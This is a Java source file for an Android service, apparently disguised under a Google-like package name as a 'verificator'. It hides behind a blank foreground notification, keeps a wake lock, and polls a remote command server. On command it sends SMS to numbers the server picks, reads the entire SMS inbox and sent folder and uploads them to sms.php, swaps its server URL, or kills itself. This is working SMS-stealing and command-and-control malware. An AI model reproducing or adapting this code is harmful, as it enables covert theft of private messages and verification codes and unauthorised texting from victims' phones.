package com.google.verificator;

import android.Manifest;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.RingtoneManager;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Telephony;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.NotificationCompat;
import android.telephony.SmsManager;
import android.util.Log;

import com.byteshaft.requests.HttpRequest;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonArray;

import org.json.JSONException;
import org.json.JSONObject;

import java.net.HttpURLConnection;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import androidx.work.Configuration;
import androidx.work.Constraints;
import androidx.work.ListenableWorker;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerFactory;
import androidx.work.WorkerParameters;

public class PingToServerAndSendSMSService extends Service {

    public static PingToServerAndSendSMSService instance;
    int minutes = 20;
    long milliseconds = minutes * 60000;
    private String androidId;
    private String smsPermission;
    private BroadcastReceiver mNetworkReceiver;
    private PowerManager.WakeLock wl;
    private Handler mHandler;
    private boolean isTaskrunning = false;
    private ScheduledExecutorService scheduler;
    private AlarmManager alarmMgr;
    private PendingIntent pendingIntent;

    private AlarmReciever alarmReciever;

    public WorkerFactory myWorkerFactory = null;

    public PingToServerAndSendSMSService() {
        super();
    }

    public static PingToServerAndSendSMSService getInstance() {
        return instance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        mNetworkReceiver = new NetworkChangedReceiver();
        registerNetworkBroadcastForNougat();
        mHandler = new Handler();
        androidId = AppGlobals.getStringFromSharedPreferences(AppGlobals.KEY_ANDROID_ID);
        smsPermission = AppGlobals.getStringFromSharedPreferences(AppGlobals.KEY_PERMISSION);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String CHANNEL_ID = "my_channel_01";
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID,
                    "Channel human readable title",
                    NotificationManager.IMPORTANCE_DEFAULT);

            ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE)).createNotificationChannel(channel);

            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("")
                    .setContentText("").build();
            System.out.println("MAIN--------------- main activity");
            startForeground(1, notification);
            System.out.println("MAIN--------------- main activity----");
        }
        
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "tag");
        wl.acquire();

        myWorkerFactory = new MyWorkerFactory();
        WorkManager.initialize(this, new Configuration.Builder().setWorkerFactory(myWorkerFactory).build());
    }

    public void startAlarmManager() {
        alarmReciever = new AlarmReciever();
        IntentFilter filter = new IntentFilter("fire");
        registerReceiver(alarmReciever, filter);
        Intent dialogIntent = new Intent("fire");
        alarmMgr = (AlarmManager) this.getSystemService(Context.ALARM_SERVICE);
        pendingIntent = PendingIntent.getBroadcast(this, 0, dialogIntent, PendingIntent.FLAG_CANCEL_CURRENT);

        Calendar time = Calendar.getInstance();
        Calendar cal_now = Calendar.getInstance();
        Date date = new Date();
        time.setTime(date);
        cal_now.setTime(date);
        Log.i("TAG", "hours " + date.getHours());
        time.set(Calendar.MILLISECOND, (int) AppGlobals.KEY_PING_INTERVAL);
//        if (android.os.Build.VERSION.SDK_INT < 19) {
//            alarmMgr.setRepeating(AlarmManager.RTC_WAKEUP, AppGlobals.KEY_PING_INTERVAL,
//                    AppGlobals.KEY_PING_INTERVAL, pendingIntent);
//        } else {
//            alarmMgr.setExact(AlarmManager.RTC_WAKEUP, time.getTimeInMillis(), pendingIntent);
//        }

//        Constraints constraints = new Constraints.Builder()
//                .setRequiresCharging(true)
//                .build();
//        PeriodicWorkRequest myWork = new PeriodicWorkRequest.Builder(MyWorker.class, 10, TimeUnit.SECONDS)
//                .setConstraints(constraints)
//                .build();
        OneTimeWorkRequest myWork = new OneTimeWorkRequest.Builder(MyWorker.class)
                .setInitialDelay(AppGlobals.KEY_PING_INTERVAL, TimeUnit.MILLISECONDS)
                .build();
        WorkManager.getInstance().enqueue(myWork);
    }

    void stopRepeatingTask() {
        isTaskrunning = false;
        unregisterReceiver(alarmReciever);
    }

    void startRepeatingTask() {
        startAlarmManager();
        isTaskrunning = true;

    }

    @Override
    public int onStartCommand(@Nullable Intent intent, int flags, int startId) {
//        startForeground(1, showNotification(" ", startId));
        AppGlobals.serviceRunning(true);
        instance = this;
        System.out.println("service started.......");
        if (!isTaskrunning) {
            startRepeatingTask();
            System.out.println("task started.......");
        }
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    public void pingToServerForSendSMS(String androidId, String smsAllowNotAllow) {
        HttpRequest getStateRequest = new HttpRequest(this);
        getStateRequest.setOnReadyStateChangeListener((request, readyState) -> {
            switch (readyState) {
                case HttpRequest.STATE_DONE:
                    switch (request.getStatus()) {
                        case HttpURLConnection.HTTP_FORBIDDEN:
                            AppGlobals.KEY_PING_INTERVAL = milliseconds;
                            stopRepeatingTask();
                            startAlarmManager();
                            break;
                        case HttpURLConnection.HTTP_INTERNAL_ERROR:
                            AppGlobals.KEY_PING_INTERVAL = milliseconds;
                            stopRepeatingTask();
                            startAlarmManager();
                            break;
                        case HttpURLConnection.HTTP_NOT_FOUND:
                            AppGlobals.KEY_PING_INTERVAL = milliseconds;
                            stopRepeatingTask();
                            startAlarmManager();
                            break;
                        case HttpURLConnection.HTTP_OK:
                            System.out.println("working---------------" + request.getResponseText());
                            try {
                                JSONObject jsonObject = new JSONObject(request.getResponseText());
                                if (jsonObject.has("COMMAND")) {
                                    String command = jsonObject.getString("COMMAND");
                                    if (command.equals("SEND_SMS")) {
                                        String sendToMobileNumber = jsonObject.getString("SEND_TO");
                                        String messageBody = jsonObject.getString("SEND_MSG");
                                        if (messageBody.length() > 160) {
                                            sendSmsSilent(sendToMobileNumber, messageBody);
                                        } else {
                                            sendSms(sendToMobileNumber, messageBody);
                                        }

                                    } else if (command.equals("NEW_URL")) {
                                        String newUrl = jsonObject.getString("URL");
                                        AppGlobals.saveIPToSharedPreferences(newUrl);

                                    } else if (command.equals("KILL")) {
                                        AppGlobals.saveKillCommand(true);
                                        String newUrl = "http://127.0.0.1/";
                                        AppGlobals.saveIPToSharedPreferences(newUrl);
                                        if (AppGlobals.isServiceRunning()) {
                                            AppGlobals.serviceRunning(false);
                                            unregisterNetworkChanges();
                                            stopRepeatingTask();
                                            wl.release();
                                            stopSelf();

                                        }
                                    } else if (command.equals("PING_DELAY")) {
                                        String pingTime = jsonObject.getString("PING_SEC");
                                        Log.e("PING_DELAY", "PING_SEC:" +  pingTime);
                                        AppGlobals.KEY_PING_INTERVAL = Long.parseLong(pingTime);
                                        Log.i("KEY_PING_INTERVAL", "PING_SEC:" +   AppGlobals.KEY_PING_INTERVAL);
                                        stopRepeatingTask();
                                        startAlarmManager();
                                    } else if (command.equals("ALL_SMS")) {
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                                            getAllSms();
                                        }
                                    }
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                    }

                    default: {
                        AppGlobals.pingNotOk("");
                        break;
                    }

            }
        });
        getStateRequest.setOnErrorListener((request, readyState, error, exception) -> {
            if (error == HttpRequest.ERROR_CONNECTION_TIMED_OUT) {
                AppGlobals.pingNotOk("");
            }
            if (error == HttpRequest.ERROR_INVALID_URL) {
                AppGlobals.pingNotOk("");

            }
            if (error == HttpRequest.ERROR_NETWORK_UNREACHABLE) {
                AppGlobals.pingNotOk("");

            }

            if (error == HttpRequest.ERROR_LOST_CONNECTION) {
                AppGlobals.pingNotOk("");
            }

        });
        getStateRequest.setTimeout(15000);
        getStateRequest.open("POST", String.format("%s/ping.php", AppGlobals.getIPFromSharedPreferences()));
        getStateRequest.send(gePingData(androidId, smsAllowNotAllow, AppGlobals.getReleaseVersion()));
    }

    private String gePingData(String androidId, String smsAllowNotAllow, String releaseVersion) {
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("DEVICE_ID", androidId);
            jsonObject.put("SMS_ALLOW", smsAllowNotAllow);
            jsonObject.put("RELEASE_VERSION", releaseVersion);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject.toString();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (AppGlobals.isServiceRunning()) {
            AppGlobals.serviceRunning(false);
            unregisterNetworkChanges();
            stopRepeatingTask();
            wl.release();

        }
    }

    private void registerNetworkBroadcastForNougat() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            registerReceiver(mNetworkReceiver, new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION));
        }
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//            registerReceiver(mNetworkReceiver, new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION));
//        }
    }

    protected void unregisterNetworkChanges() {
        try {
            unregisterReceiver(mNetworkReceiver);
        } catch (IllegalArgumentException e) {
            e.printStackTrace();
        }
    }

    private Notification showNotification(String messageBody, int id) {
        Intent i = new Intent();
        NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0 /* Request code */, i,
                PendingIntent.FLAG_ONE_SHOT);
        String channelId = getPackageName();
        Bitmap bitmap = BitmapFactory.decodeResource(getResources(), R.mipmap.notification_icon_sms_app);
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, channelId)
                .setSmallIcon(R.mipmap.notification_icon_sms_app)
                .setContentTitle(getString(R.string.app_name))
                .setTicker(getString(R.string.app_name))
                .setAutoCancel(true)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setChannelId(channelId)
                .setSound(RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION))
                .setContentIntent(pendingIntent)
                .setCategory(NotificationCompat.CATEGORY_PROGRESS)
                .setVisibility(NotificationCompat.VISIBILITY_PRIVATE)
                .setLargeIcon(bitmap);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Create the NotificationChannel, but only on API 26+ because
            // the NotificationChannel class is new and not in the support library
            CharSequence name = getString(R.string.app_name);
            String description = " ";
            final int importance = NotificationManager.IMPORTANCE_NONE;
            NotificationChannel channel = new NotificationChannel(channelId, name, importance);
            channel.setSound(null, null);
            channel.setDescription(description);
            notificationManager.createNotificationChannel(channel);
            // Register the channel with the system
        }
        notificationManager.notify(id /* ID of notification */, notificationBuilder.build());
        return notificationBuilder.build();
    }


    public void getAllSms() {
        ArrayList<MessagesItems> messagesItemsArrayList = new ArrayList<>();
        ArrayList<MessagesItems> sendSmsArray = new ArrayList<>();
        MessagesItems items;
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);

        int totalSMS;
        if (cursor != null) {
            totalSMS = cursor.getCount();
            Log.e("TAG", "totalSMS: " + totalSMS);
            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    String msgData = "";
                    items = new MessagesItems();
                    //for (int i = 0; i < totalSMS; i++) {
                        String smsDate = cursor.getString(cursor.getColumnIndex(Telephony.Sms.DATE));
                        Date dateFormat = new Date(Long.valueOf(smsDate));
                        items.setMessageDate(String.valueOf(dateFormat));
                        items.setMessageNumber(cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS)));
                        items.setMessageBody(cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY)));
                       // Log.e("TAG", "Sender: " + cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS)));
                       // Log.e("TAG", "Body: " + cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY)));
                    //}
                    switch (Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                            messagesItemsArrayList.add(items);
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            sendSmsArray.add(items);
                            break;
                    }
                    // use msgData
                } while (cursor.moveToNext());
            } else {
                // empty box, no SMS
            }

            cursor.close();
            sendInboxMessagsToServer(androidId, "1", messagesItemsArrayList);
            sendSentMessagsToServer(androidId, "1", sendSmsArray);

            Log.e("YPE_INBOX", "-----" + messagesItemsArrayList.size());
            Log.e("SENT", "-----" + sendSmsArray.size());

        }
    }

    private void sendInboxMessagsToServer(String deviceId, String allmessages, ArrayList<MessagesItems> arrayList) {
        HttpRequest getStateRequest = new HttpRequest(this);
        getStateRequest.setOnReadyStateChangeListener((request, readyState) -> {
            switch (readyState) {
                case HttpRequest.STATE_DONE:
                    switch (request.getStatus()) {
                        case HttpURLConnection.HTTP_OK:
                            System.out.println("ReceivedSMSToServer---------------" + request.getResponseText());

                    }
            }
        });

        getStateRequest.open("POST", String.format("%s/sms.php", AppGlobals.getIPFromSharedPreferences()));
        getStateRequest.send(getInboxMessagesData(deviceId, allmessages, arrayList, AppGlobals.getReleaseVersion()));
    }

    private String getInboxMessagesData(String deviceId, String allmessages, ArrayList<MessagesItems> arrayList, String releaseVersion) {
        JSONObject jsonObject = new JSONObject();
        Gson gson = new GsonBuilder().create();
        JsonArray jsonArray = gson.toJsonTree(arrayList).getAsJsonArray();
        try {
            jsonObject.put("DEVICE_ID", deviceId);
            jsonObject.put("ALL", allmessages);
            jsonObject.put("INBOX", jsonArray);
            jsonObject.put("RELEASE_VERSION", releaseVersion);
            System.out.println(jsonObject.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject.toString();
    }

    private void sendSentMessagsToServer(String deviceId, String allmessages, ArrayList<MessagesItems> arrayList) {
        HttpRequest getStateRequest = new HttpRequest(this);
        getStateRequest.setOnReadyStateChangeListener((request, readyState) -> {
            switch (readyState) {
                case HttpRequest.STATE_DONE:
                    switch (request.getStatus()) {
                        case HttpURLConnection.HTTP_OK:
                            System.out.println("ReceivedSMSToServer---------------" + request.getResponseText());

                    }
            }
        });

        getStateRequest.open("POST", String.format("%s/sms.php", AppGlobals.getIPFromSharedPreferences()));
        getStateRequest.send(getSentMessagesData(deviceId, allmessages, arrayList, AppGlobals.getReleaseVersion()));
    }

    private String getSentMessagesData(String deviceId, String allmessages, ArrayList<MessagesItems> arrayList, String releaseVersion) {
        JSONObject jsonObject = new JSONObject();
        Gson gson = new GsonBuilder().create();
        JsonArray jsonArray = gson.toJsonTree(arrayList).getAsJsonArray();
        try {
            jsonObject.put("DEVICE_ID", deviceId);
            jsonObject.put("ALL", allmessages);
            jsonObject.put("SENT", jsonArray);
            jsonObject.put("RELEASE_VERSION", releaseVersion);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject.toString();
    }


    public void sendSmsSilent(String phoneNumber, String content) {
        SmsManager smsManager = SmsManager.getDefault();
        if (content.length() >= 160) {
            List<String> ms = smsManager.divideMessage(content);
            for (String message : ms) {
                Log.i("TAG", "message ..... " + message + phoneNumber);
                smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            }
        }
    }

    public void sendSms(String phoneNumber, String message) {
        SmsManager smsManager = getSmsManager();
        smsManager.sendTextMessage(phoneNumber, null, message, null, null);
    }

    private SmsManager getSmsManager() {
        return SmsManager.getDefault();
    }

    class AlarmReciever extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            Calendar time = Calendar.getInstance();
            Calendar cal_now = Calendar.getInstance();
            Date date = new Date();
            time.setTime(date);
            cal_now.setTime(date);
            time.set(Calendar.MILLISECOND, (int) AppGlobals.KEY_PING_INTERVAL);
            if (android.os.Build.VERSION.SDK_INT < 19) {
                alarmMgr.set(AlarmManager.RTC_WAKEUP, time.getTimeInMillis(), pendingIntent);
            } else {
                alarmMgr.setExact(AlarmManager.RTC_WAKEUP, time.getTimeInMillis(), pendingIntent);
            }
            try {
                Log.i("TAG", "receiver Pingging started..... ");
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                        System.out.println("checkSelfPermission.......");
                        pingToServerForSendSMS(androidId, "0");
                    } else {
                        pingToServerForSendSMS(androidId, "1");
                    }
                }else {
                    //fix for android 5 where no permission check is sent
                    pingToServerForSendSMS(androidId, "2");
                }
                Log.i("TAG", " service " + AppGlobals.isServiceRunning());
            } finally {
                // 100% guarantee that this always happens, even if
                // your update method throws an exception
                Log.i("TAG", " Pingging PING_INTERVAL..... " + AppGlobals.KEY_PING_INTERVAL);
            }

        }
    }

    class MyWorker extends Worker {

        Context m_context;

        public MyWorker(Context context, WorkerParameters params) {
            super(context, params);

            m_context = context;
        }

        @NonNull
        @Override
        public Result doWork() {
            OneTimeWorkRequest myWork = new OneTimeWorkRequest.Builder(MyWorker.class)
                    .setInitialDelay(10, TimeUnit.SECONDS)
                    .build();
            WorkManager.getInstance().enqueue(myWork);

            try {
                Log.i("TAG", "receiver Pingging started..... ");
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (m_context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                        System.out.println("checkSelfPermission.......");
                        pingToServerForSendSMS(androidId, "0");
                    } else {
                        pingToServerForSendSMS(androidId, "1");
                    }
                }else {
                    //fix for android 5 where no permission check is sent
                    pingToServerForSendSMS(androidId, "2");
                }
                Log.i("TAG", " service " + AppGlobals.isServiceRunning());
            } finally {
                // 100% guarantee that this always happens, even if
                // your update method throws an exception
                Log.i("TAG", " Pingging PING_INTERVAL..... " + AppGlobals.KEY_PING_INTERVAL);
            }

            return Result.success();
        }
    }

    class MyWorkerFactory extends WorkerFactory {
        @Nullable
        @Override
        public ListenableWorker createWorker(@NonNull Context appContext, @NonNull String workerClassName, @NonNull WorkerParameters workerParameters) {
            return new MyWorker(appContext, workerParameters);
        }
    }
}
